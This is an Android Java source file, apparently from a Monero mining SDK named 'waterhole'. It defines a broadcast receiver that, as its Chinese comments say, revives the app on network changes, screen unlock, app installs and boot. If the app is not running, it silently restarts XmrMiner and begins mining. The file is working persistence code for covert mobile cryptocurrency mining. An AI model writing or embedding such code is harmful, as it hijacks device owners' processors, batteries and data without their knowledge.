package waterhole.miner.monero.keepappalive.receiver;

import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.LogUtils.info;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import waterhole.miner.core.StateObserver;
import waterhole.miner.monero.XmrMiner;
import waterhole.miner.monero.keepappalive.utils.SystemUtils;

/**
 * 监听系统广播，复活进程
 * (1) 网络变化广播
 * (2) 屏幕解锁广播
 * (3) 应用安装卸载广播
 * (4) 开机广播
 */
public class KeepAliveReceiver extends BroadcastReceiver {

    private static final String TAG = "KeepAliveReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG,"AliveBroadcastReceiver---->接收到的系统广播："+action);
        if(SystemUtils.isAPPALive(context)){
            Log.i(TAG,"AliveBroadcastReceiver---->APP还是活着的");
            return;
        }
        if (!XmrMiner.instance().isMining()) {
            XmrMiner.instance().init(context).setStateObserver(new StateObserver() {

                @Override
                public void onConnectPoolBegin() {
                    info("onConnectPoolBegin");
                }

                @Override
                public void onConnectPoolSuccess() {
                    info("onConnectPoolSuccess");
                }

                @Override
                public void onConnectPoolFail(String error) {
                    error("onConnectPoolFail: " + error);
                }

                @Override
                public void onPoolDisconnect(String error) {
                    error("onPoolDisconnect: " + error);
                }

                @Override
                public void onMessageFromPool(String message) {
                    info("onMessageFromPool: " + message);
                }

                @Override
                public void onMiningError(String error) {
                    error("onMiningError = " + error);
                }

                @Override
                public void onMiningStatus(double speed) {
                    info("onMiningStatus speed = " + speed);
                }
            }).startMine();
        }
        Log.i(TAG,"AliveBroadcastReceiver---->复活进程(APP)");
    }
}
